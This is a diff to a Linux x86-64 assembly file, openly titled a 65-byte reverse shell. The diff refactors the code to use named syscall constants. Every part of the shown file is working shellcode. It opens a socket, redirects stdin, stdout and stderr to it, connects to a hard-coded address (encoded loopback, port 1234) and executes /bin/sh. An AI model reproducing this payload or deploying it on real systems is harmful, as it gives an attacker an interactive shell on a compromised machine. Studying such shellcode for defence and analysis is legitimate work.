@@ -26,48 +26,56 @@
 ;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
-;    
+;
 
 ; 65 byte reverse shell for linux/x86-64
 ; odzhan
 
     bits    64
-    
+
+    %define AMD64
+    %include "include.inc"
+
+    %ifndef BIN
+      global _start
+    %endif
+
+_start:
     ; step 1, create a socket
-    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-    push    41               ; SYS_SOCKET 
-    pop     rax    
-    push    1                ; SOCK_STREAM
+    ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+    push    SYS_socket
+    pop     rax
+    push    SOCK_STREAM
     pop     rsi
-    push    2                ; AF_INET
+    push    AF_INET
     pop     rdi
     cdq                      ; IPPROTO_IP
     syscall
-    
+
     xchg    eax, edi         ; edi = s, eax = 2
     xchg    eax, esi         ; esi = 2, eax = 1
-    
+
     ; step 2, assign socket handle to stdin,stdout,stderr
     ; dup2 (s, STDIN_FILENO)
     ; dup2 (s, STDOUT_FILENO)
     ; dup2 (s, STDERR_FILENO)
-dup_loop64:
-    mov     al, 33           ; rax = sys_dup2
+c_dup:
+    mov     al, SYS_dup2
     syscall
-    dec     esi 
-    jns     dup_loop64       ; jump if not signed
-    
+    sub     esi, 1
+    jns     c_dup       ; jump if not signed
+
     ; step 3, connect to remote host
     ; connect (s, &sa, sizeof(sa));
     mov     rcx, ~0x0100007fd2040002
     not     rcx
     push    rcx
-    push    rsp    
+    push    rsp
     pop     rsi              ; rsi = &sa
     mov     dl, 16           ; rdx = sizeof(sa)
-    mov     al, 42           ; rax = sys_connect
-    syscall    
-    
+    mov     al, SYS_connect
+    syscall
+
     ; step 4, execute /bin/sh
     ; execv("/bin//sh", 0, 0);
     cdq
@@ -77,7 +85,6 @@ dup_loop64:
     mov     rcx, '/bin//sh'
     push    rcx
     push    rsp
-    pop     rdi    
-    mov     al, 59           ; rax = sys_execve
+    pop     rdi
+    mov     al, SYS_execve
     syscall
-    
